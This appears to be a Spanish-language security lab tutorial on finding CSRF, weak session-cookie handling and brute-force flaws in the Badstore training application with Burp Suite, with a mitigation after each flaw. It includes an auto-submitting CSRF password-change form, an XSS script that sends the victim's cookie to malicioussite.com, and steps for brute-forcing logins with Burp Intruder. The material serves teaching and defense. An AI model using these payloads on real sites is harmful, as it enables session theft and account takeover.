### Técnica 3: Exploración de múltiples vulnerabilidades en Badstore usando Burp Suite

#### Paso 1: Exploración y análisis inicial con Burp Suite

El primer paso para encontrar vulnerabilidades es realizar una exploración y análisis exhaustivo del sitio utilizando **Burp Suite Scanner**. Aquí, Burp Suite revisa automáticamente el sitio para encontrar posibles fallos de seguridad.

1. **Configurar Burp Suite para interceptar el tráfico**:
   - Abre Burp Suite y configura tu navegador para que utilice el proxy de Burp Suite (generalmente `127.0.0.1:8080`).
   - Navega por Badstore, llenando formularios, iniciando sesión y realizando otras acciones mientras Burp Suite intercepta y analiza las solicitudes.
2. **Hacer uso de Burp Suite Scanner**:
   - En la pestaña de **Target** en Burp Suite, marca las URL y directorios que deseas escanear (todo el sitio si es necesario).
   - Haz clic derecho en los directorios seleccionados y selecciona **Scan**.
   - Burp Suite Scanner buscará automáticamente vulnerabilidades comunes en todas las rutas seleccionadas, como inyecciones, vulnerabilidades XSS, CSRF y manejo inseguro de sesiones.

#### Paso 2: Detectar vulnerabilidad **Cross-Site Request Forgery (CSRF)**

**CSRF** es un ataque que ocurre cuando un atacante engaña a un usuario autenticado para que realice una acción no deseada en una aplicación web donde el usuario tiene privilegios. El atacante envía una solicitud maliciosa al servidor a nombre del usuario autenticado sin su consentimiento.

1. **Interceptar una solicitud sensible** (por ejemplo, cambiar la contraseña de un usuario):

   - Navega por la página Badstore hasta llegar a una página donde el usuario puede cambiar su información personal (como una página de perfil o cambio de contraseña).
   - Intercepta la solicitud de actualización o cambio con Burp Suite.

2. **Examinar la solicitud**:

   - Verifica si en la solicitud existe algún **token CSRF** o si se basa únicamente en la cookie de sesión del usuario.
   - Si no existe ningún token o validación adicional, es probable que la aplicación sea vulnerable a ataques CSRF.

3. **Explotar la vulnerabilidad CSRF**:

   - Guarda la solicitud interceptada y crea un archivo HTML malicioso que envíe una solicitud similar sin la interacción del usuario. Por ejemplo:

     ```html
     <form action="http://localhost/badstore/change_password.php" method="POST">
       <input type="hidden" name="new_password" value="hacked123">
       <input type="submit" value="Change Password">
     </form>
     <script>
       document.forms[0].submit();
     </script>
     ```

   - Cuando un usuario autenticado visite este HTML malicioso, su contraseña será cambiada sin su consentimiento.

#### Mitigación para CSRF

1. **Usar tokens CSRF**: Implementa un token anti-CSRF en todos los formularios y solicitudes sensibles. Este token debe ser único para cada sesión de usuario y verificado en el servidor antes de procesar la solicitud.
2. **Verificar la fuente de la solicitud**: Asegúrate de que la solicitud provenga del mismo dominio o verifique los encabezados `Origin` o `Referer` antes de ejecutar cualquier acción sensible.

#### Paso 3: Detectar vulnerabilidad en **Manejo inadecuado de cookies de sesión**

Si las cookies de sesión no están configuradas correctamente, los atacantes pueden secuestrar la sesión del usuario. Por ejemplo, si las cookies no tienen el atributo **HttpOnly**, un atacante podría robarlas usando JavaScript.

1. **Revisar las cookies**:

   - Intercepta cualquier solicitud autenticada (por ejemplo, cuando inicias sesión en Badstore).
   - En la pestaña **Proxy** > **HTTP history** de Burp Suite, revisa las respuestas del servidor que contienen las cookies de sesión.
   - Verifica si las cookies de sesión tienen los atributos `HttpOnly` y `Secure`. Si estos atributos están ausentes, la aplicación es vulnerable a ataques de secuestro de sesión.

2. **Explotar la vulnerabilidad**:

   - Si el atributo `HttpOnly` no está presente, puedes inyectar un script XSS (como en el ejemplo de XSS anterior) para robar la cookie de sesión del usuario.

   - Inyecta un script como el siguiente en un campo de entrada vulnerable:

     ```javascript
     <script>
       document.location='http://malicioussite.com/steal.php?cookie='+document.cookie;
     </script>
     ```

   - El script redirige al usuario a un sitio malicioso y envía su cookie de sesión en la URL.

#### Mitigación para el manejo de cookies

1. **Configurar el atributo HttpOnly**: Asegúrate de que las cookies de sesión tengan el atributo `HttpOnly`, lo que impide que el script del lado del cliente acceda a las cookies.
2. **Usar el atributo Secure**: Establece el atributo `Secure` en las cookies para que solo se transmitan a través de conexiones HTTPS seguras.

#### Paso 4: Detectar vulnerabilidad de **Fuerza Bruta en la autenticación**

La autenticación débil o sin medidas de seguridad adicionales como bloqueos temporales después de múltiples intentos fallidos permite a los atacantes realizar ataques de fuerza bruta para descubrir credenciales de usuarios.

1. **Interceptar la solicitud de inicio de sesión**:
   - Navega al formulario de inicio de sesión de Badstore y realiza una solicitud legítima para interceptarla con Burp Suite.
2. **Enviar la solicitud a Burp Intruder**:
   - Haz clic derecho sobre la solicitud interceptada y selecciona **Send to Intruder**.
   - En la pestaña de **Intruder**, marca los campos de nombre de usuario y contraseña como posiciones de ataque (Positions).
3. **Configurar los Payloads**:
   - En la pestaña de **Payloads**, selecciona el tipo de payload **Simple list**.
   - Carga listas de usuarios y contraseñas comunes para realizar el ataque de fuerza bruta.
4. **Ejecutar el ataque**:
   - Ejecuta el ataque de fuerza bruta y revisa las respuestas HTTP para identificar credenciales válidas (generalmente se puede ver por la diferencia en la longitud de las respuestas o por una redirección exitosa a la página de inicio del usuario).

#### Mitigación para fuerza bruta

1. **Implementar bloqueos temporales**: Después de varios intentos fallidos de inicio de sesión, bloquea temporalmente la cuenta o implementa CAPTCHAs.
2. **Usar contraseñas fuertes**: Implementa políticas de contraseñas que requieran contraseñas complejas y utiliza autenticación multifactor (MFA).

------

### Conclusión

Utilizando **Burp Suite**, hemos explorado múltiples vulnerabilidades como **CSRF**, **manejo inadecuado de cookies de sesión**, y **fuerza bruta en autenticación**. Es importante realizar análisis regulares y emplear las siguientes medidas para mitigar estas vulnerabilidades:

- **Tokens CSRF** para evitar ataques de Cross-Site Request Forgery.
- **HttpOnly y Secure** en las cookies para prevenir secuestro de sesiones.
- **Mecanismos de bloqueo y CAPTCHA** para proteger los formularios de inicio de sesión de ataques de fuerza bruta.